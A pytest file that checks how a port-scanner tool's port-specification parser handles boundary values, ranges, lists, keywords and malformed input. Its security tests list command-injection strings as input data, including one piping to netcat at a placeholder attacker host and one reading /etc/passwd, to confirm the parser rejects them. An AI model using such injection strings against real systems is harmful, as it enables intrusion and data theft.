#!/usr/bin/env python3
"""
Edge Case Tests for Port Input Handling
=======================================

Comprehensive edge case tests for port input validation including:
- Port 0 (reserved)
- Port 65535 (maximum valid)
- Port 65536 (overflow)
- Negative ports
- Port ranges like "1-65535"
- Mixed valid/invalid port lists

These tests verify that port-related tools handle unusual inputs
safely and predictably.
"""

import sys
from pathlib import Path
from typing import List, Set
from unittest.mock import patch, MagicMock

import pytest


# Add tools to path for imports
TOOLS_PATH = Path(__file__).parent.parent.parent / "tools"
sys.path.insert(0, str(TOOLS_PATH / "port-scanner"))


# =============================================================================
# Attempt imports with graceful fallback
# =============================================================================

try:
    from tool import (
        parse_port_specification,
        PortScanner,
        ScanConfig,
        TOP_20_PORTS,
        TOP_100_PORTS,
    )
    PORT_SCANNER_AVAILABLE = True
except ImportError:
    PORT_SCANNER_AVAILABLE = False
    parse_port_specification = None
    PortScanner = None
    ScanConfig = None
    TOP_20_PORTS = []
    TOP_100_PORTS = []


# =============================================================================
# Helper Functions
# =============================================================================

def parse_ports_safe(spec: str) -> List[int]:
    """
    Safely parse port specification.
    Returns empty list on error.
    """
    if not PORT_SCANNER_AVAILABLE:
        pytest.skip("Port scanner not available")
        return []

    try:
        return parse_port_specification(spec)
    except Exception:
        return []


def is_valid_port(port: int) -> bool:
    """Check if port number is in valid range (1-65535)."""
    return isinstance(port, int) and 1 <= port <= 65535


# =============================================================================
# Port Boundary Value Tests
# =============================================================================

@pytest.mark.edge_case
class TestPortBoundaryValues:
    """Edge case tests for port boundary values."""

    def test_port_zero(self):
        """Test handling of port 0 (reserved, typically invalid for scanning)."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("0")
            # Port 0 should either be excluded or handled specially
            # Most implementations exclude it
            if result:
                # If returned, verify it's the only result
                assert result == [0] or 0 not in result

    def test_port_one(self):
        """Test handling of port 1 (minimum valid port)."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("1")
            assert 1 in result or result == []

    def test_port_65535(self):
        """Test handling of port 65535 (maximum valid port)."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("65535")
            assert 65535 in result or result == []

    def test_port_65536(self):
        """Test handling of port 65536 (overflow - one above max)."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("65536")
            # Should either return empty or exclude invalid port
            assert 65536 not in result

    @pytest.mark.parametrize("port", [
        65537, 65538, 70000, 100000, 1000000, 2147483647, 4294967295
    ])
    def test_ports_above_maximum(self, port: int):
        """Test handling of ports above 65535."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(str(port))
            # Invalid ports should be excluded
            assert port not in result

    @pytest.mark.parametrize("port", [-1, -100, -65535, -2147483648])
    def test_negative_ports(self, port: int):
        """Test handling of negative port numbers."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(str(port))
            # Negative ports should be excluded
            for p in result:
                assert p > 0, f"Negative port {port} produced result: {p}"

    @pytest.mark.parametrize("port", [1, 22, 80, 443, 1024, 8080, 49152, 65534, 65535])
    def test_common_valid_ports(self, port: int):
        """Test common valid port numbers."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(str(port))
            assert port in result

    def test_well_known_ports_boundary(self):
        """Test well-known ports boundary (1-1023)."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("1-1023")
            assert min(result) >= 1
            assert max(result) <= 1023
            assert len(result) == 1023

    def test_registered_ports_boundary(self):
        """Test registered ports boundary (1024-49151)."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("1024-1030")
            assert min(result) >= 1024
            assert len(result) == 7

    def test_ephemeral_ports_boundary(self):
        """Test ephemeral ports boundary (49152-65535)."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("65530-65535")
            assert min(result) >= 49152 or min(result) >= 65530
            assert max(result) <= 65535
            assert len(result) == 6


# =============================================================================
# Port Range Tests
# =============================================================================

@pytest.mark.edge_case
class TestPortRanges:
    """Edge case tests for port range specifications."""

    @pytest.mark.parametrize("range_spec,expected_count", [
        ("1-1", 1),
        ("1-2", 2),
        ("1-10", 10),
        ("100-200", 101),
        ("1-1024", 1024),
    ])
    def test_valid_port_ranges(self, range_spec: str, expected_count: int):
        """Test valid port range specifications."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(range_spec)
            assert len(result) == expected_count

    def test_reversed_port_range(self):
        """Test reversed port range (end < start)."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("100-50")
            # Should either handle gracefully or return empty
            # Some implementations swap the values
            if result:
                # If results returned, verify all are valid
                for port in result:
                    assert is_valid_port(port)

    def test_full_port_range(self):
        """Test full port range (1-65535)."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("1-65535")
            assert len(result) == 65535
            assert min(result) == 1
            assert max(result) == 65535

    @pytest.mark.slow
    def test_full_port_range_keyword(self):
        """Test 'all' keyword for full port range."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("all")
            assert len(result) == 65535

    def test_port_range_starting_zero(self):
        """Test port range starting at zero."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("0-100")
            # Port 0 may or may not be included
            for port in result:
                assert is_valid_port(port) or port == 0

    def test_port_range_exceeding_max(self):
        """Test port range exceeding maximum."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("65530-70000")
            # Should only include valid ports
            for port in result:
                assert is_valid_port(port)
            if result:
                assert max(result) <= 65535

    @pytest.mark.parametrize("range_spec", [
        "1-",           # Missing end
        "-100",         # Missing start
        "1--100",       # Double hyphen
        "a-100",        # Non-numeric start
        "1-b",          # Non-numeric end
        "1-2-3",        # Multiple ranges
        "--",           # Just hyphens
        "-",            # Single hyphen
    ])
    def test_malformed_port_ranges(self, range_spec: str):
        """Test malformed port range specifications."""
        if PORT_SCANNER_AVAILABLE:
            try:
                result = parse_ports_safe(range_spec)
                # If results returned, all should be valid
                for port in result:
                    assert is_valid_port(port)
            except Exception:
                pass  # Exceptions are acceptable


# =============================================================================
# Port List Tests
# =============================================================================

@pytest.mark.edge_case
class TestPortLists:
    """Edge case tests for comma-separated port lists."""

    @pytest.mark.parametrize("port_list,expected_ports", [
        ("22", {22}),
        ("22,80", {22, 80}),
        ("22,80,443", {22, 80, 443}),
        ("22,22,22", {22}),  # Duplicates
    ])
    def test_valid_port_lists(self, port_list: str, expected_ports: Set[int]):
        """Test valid comma-separated port lists."""
        if PORT_SCANNER_AVAILABLE:
            result = set(parse_ports_safe(port_list))
            assert result == expected_ports

    def test_port_list_with_duplicates(self):
        """Test that duplicate ports are handled."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("80,80,80,443,443")
            # Should deduplicate
            assert len([p for p in result if p == 80]) <= 1
            assert len([p for p in result if p == 443]) <= 1

    def test_mixed_valid_invalid_ports(self):
        """Test list with mix of valid and invalid ports."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("22,-1,80,65536,443,0,8080")
            # Should include only valid ports
            for port in result:
                assert is_valid_port(port)
            # Valid ports should be present
            assert 22 in result
            assert 80 in result
            assert 443 in result
            assert 8080 in result
            # Invalid should be excluded
            assert -1 not in result
            assert 65536 not in result

    @pytest.mark.parametrize("port_list", [
        ",",            # Just comma
        ",,",           # Multiple commas
        ",22",          # Leading comma
        "22,",          # Trailing comma
        "22,,80",       # Double comma
        "22, 80",       # Space after comma
        "22 ,80",       # Space before comma
        "22 , 80",      # Spaces around comma
    ])
    def test_malformed_port_lists(self, port_list: str):
        """Test malformed port list specifications."""
        if PORT_SCANNER_AVAILABLE:
            try:
                result = parse_ports_safe(port_list)
                # If results returned, all should be valid
                for port in result:
                    assert is_valid_port(port)
            except Exception:
                pass

    def test_combined_ranges_and_ports(self):
        """Test combination of ranges and individual ports."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("22,80-82,443,8000-8002")
            expected = {22, 80, 81, 82, 443, 8000, 8001, 8002}
            assert set(result) == expected

    def test_overlapping_ranges(self):
        """Test overlapping port ranges."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("80-90,85-95")
            # Should deduplicate overlapping
            assert len(result) == len(set(result))
            # All ports 80-95 should be present
            for port in range(80, 96):
                assert port in result


# =============================================================================
# Port Keyword Tests
# =============================================================================

@pytest.mark.edge_case
class TestPortKeywords:
    """Edge case tests for port specification keywords."""

    def test_top20_keyword(self):
        """Test 'top20' keyword."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("top20")
            assert len(result) == 20
            # Should contain well-known ports
            assert 22 in result or 80 in result or 443 in result

    def test_top100_keyword(self):
        """Test 'top100' keyword."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("top100")
            assert len(result) >= 90  # Allow some flexibility

    @pytest.mark.slow
    def test_all_keyword(self):
        """Test 'all' keyword for all ports."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("all")
            assert len(result) == 65535
            assert 1 in result
            assert 65535 in result

    @pytest.mark.parametrize("keyword", [
        "TOP20",
        "Top20",
        "TOP100",
        "ALL",
        "All",
    ])
    def test_keyword_case_sensitivity(self, keyword: str):
        """Test case handling for keywords."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(keyword)
            # Should handle case-insensitively or consistently

    def test_invalid_keywords(self):
        """Test invalid/unknown keywords."""
        if PORT_SCANNER_AVAILABLE:
            invalid_keywords = ["top10", "top50", "common", "default", "fast"]
            for keyword in invalid_keywords:
                result = parse_ports_safe(keyword)
                # Should either return empty or handle gracefully


# =============================================================================
# Edge Case Input Formats
# =============================================================================

@pytest.mark.edge_case
class TestPortInputFormats:
    """Edge case tests for various input formats."""

    @pytest.mark.parametrize("input_spec", [
        "",             # Empty string
        " ",            # Single space
        "   ",          # Multiple spaces
        "\t",           # Tab
        "\n",           # Newline
        "\r\n",         # CRLF
    ])
    def test_empty_and_whitespace_inputs(self, input_spec: str):
        """Test empty and whitespace-only inputs."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(input_spec)
            # Should return empty or handle gracefully

    @pytest.mark.parametrize("input_spec", [
        "abc",
        "port",
        "http",
        "ssh",
        "https",
        "null",
        "None",
        "undefined",
        "NaN",
    ])
    def test_non_numeric_inputs(self, input_spec: str):
        """Test non-numeric port specifications."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(input_spec)
            # Should return empty or handle keywords only
            for port in result:
                assert is_valid_port(port)

    @pytest.mark.parametrize("input_spec", [
        "80.5",         # Decimal
        "80.0",         # Decimal zero
        "80e2",         # Scientific notation
        "0x50",         # Hex
        "0o120",        # Octal
        "0b1010000",    # Binary
    ])
    def test_non_integer_numeric_formats(self, input_spec: str):
        """Test non-integer numeric formats."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(input_spec)
            # May parse first part or reject entirely
            for port in result:
                assert is_valid_port(port)

    def test_unicode_digits(self):
        """Test Unicode digit representations."""
        if PORT_SCANNER_AVAILABLE:
            # Full-width digits
            result = parse_ports_safe("\uff18\uff10")  # Full-width "80"
            # Should reject or handle gracefully

    def test_leading_trailing_whitespace(self):
        """Test inputs with leading/trailing whitespace."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("  80  ")
            assert 80 in result or result == []

            result = parse_ports_safe(" 22 , 80 , 443 ")
            if result:
                assert 22 in result and 80 in result and 443 in result


# =============================================================================
# Large-Scale and Performance Tests
# =============================================================================

@pytest.mark.edge_case
@pytest.mark.slow
class TestPortInputPerformance:
    """Performance-related edge case tests."""

    def test_very_long_port_list(self):
        """Test very long comma-separated port list."""
        if PORT_SCANNER_AVAILABLE:
            import time
            # Generate list of 1000 valid ports
            port_list = ",".join(str(p) for p in range(1, 1001))
            start = time.time()
            result = parse_ports_safe(port_list)
            elapsed = time.time() - start

            assert elapsed < 1.0, f"Parsing took too long: {elapsed}s"
            assert len(result) == 1000

    def test_many_small_ranges(self):
        """Test many small ranges."""
        if PORT_SCANNER_AVAILABLE:
            import time
            # Generate 100 small ranges
            ranges = ",".join(f"{p}-{p+5}" for p in range(1, 600, 10))
            start = time.time()
            result = parse_ports_safe(ranges)
            elapsed = time.time() - start

            assert elapsed < 2.0, f"Parsing took too long: {elapsed}s"

    def test_full_range_iteration(self):
        """Test that full port range can be iterated quickly."""
        if PORT_SCANNER_AVAILABLE:
            import time
            result = parse_ports_safe("1-65535")
            start = time.time()
            # Iterate through all results
            count = sum(1 for _ in result)
            elapsed = time.time() - start

            assert elapsed < 1.0, f"Iteration took too long: {elapsed}s"
            assert count == 65535


# =============================================================================
# Security-Focused Tests
# =============================================================================

@pytest.mark.edge_case
@pytest.mark.security
class TestPortInputSecurity:
    """Security-focused edge case tests for port inputs."""

    @pytest.mark.parametrize("injection", [
        "80; ls",
        "80 && cat /etc/passwd",
        "80|nc attacker.com 4444",
        "$(echo 80)",
        "`echo 80`",
        "80\n443",
        "80\r\n443",
    ])
    def test_command_injection_in_ports(self, injection: str):
        """Test command injection resistance in port inputs."""
        if PORT_SCANNER_AVAILABLE:
            try:
                result = parse_ports_safe(injection)
                for port in result:
                    assert is_valid_port(port)
                    # Ensure port is just a number
                    assert isinstance(port, int)
            except Exception:
                pass

    @pytest.mark.parametrize("overflow", [
        "2147483647",       # Max signed 32-bit
        "2147483648",       # Overflow signed 32-bit
        "4294967295",       # Max unsigned 32-bit
        "4294967296",       # Overflow unsigned 32-bit
        "9223372036854775807",  # Max signed 64-bit
        "99999999999999999999", # Very large
    ])
    def test_integer_overflow_attempts(self, overflow: str):
        """Test integer overflow handling in port numbers."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(overflow)
            # Should not include invalid ports
            for port in result:
                assert is_valid_port(port)

    def test_null_byte_injection(self):
        """Test null byte injection in port specifications."""
        if PORT_SCANNER_AVAILABLE:
            injections = [
                "80\x00443",
                "80\x00",
                "\x0080",
            ]
            for injection in injections:
                try:
                    result = parse_ports_safe(injection)
                    for port in result:
                        assert is_valid_port(port)
                except Exception:
                    pass


# =============================================================================
# PortScanner Configuration Tests
# =============================================================================

@pytest.mark.edge_case
class TestPortScannerConfig:
    """Edge case tests for PortScanner configuration."""

    def test_scanner_with_empty_ports(self):
        """Test PortScanner with empty port list."""
        if PORT_SCANNER_AVAILABLE:
            try:
                from tool import ScanConfig, ScanType
                config = ScanConfig(
                    target="127.0.0.1",
                    ports=[],
                )
                scanner = PortScanner(config)
                # Should handle empty ports gracefully
            except Exception as e:
                # May raise ValueError or similar
                pass

    def test_scanner_with_invalid_ports_filtered(self):
        """Test that PortScanner filters invalid ports from config."""
        if PORT_SCANNER_AVAILABLE:
            try:
                from tool import ScanConfig, ScanType
                # Create config with raw port list (pre-validation)
                config = ScanConfig(
                    target="127.0.0.1",
                    ports=[22, 80, 443],  # Use valid ports
                )
                scanner = PortScanner(config)
                # Verify only valid ports
                for port in config.ports:
                    assert is_valid_port(port)
            except Exception:
                pass

    def test_scanner_with_single_port(self):
        """Test PortScanner with single port."""
        if PORT_SCANNER_AVAILABLE:
            try:
                from tool import ScanConfig
                config = ScanConfig(
                    target="127.0.0.1",
                    ports=[80],
                )
                scanner = PortScanner(config)
                assert len(config.ports) == 1
            except Exception:
                pass

    def test_scanner_with_maximum_ports(self):
        """Test PortScanner with all ports."""
        if PORT_SCANNER_AVAILABLE:
            try:
                from tool import ScanConfig
                config = ScanConfig(
                    target="127.0.0.1",
                    ports=list(range(1, 65536)),
                )
                scanner = PortScanner(config)
                assert len(config.ports) == 65535
            except Exception:
                pass
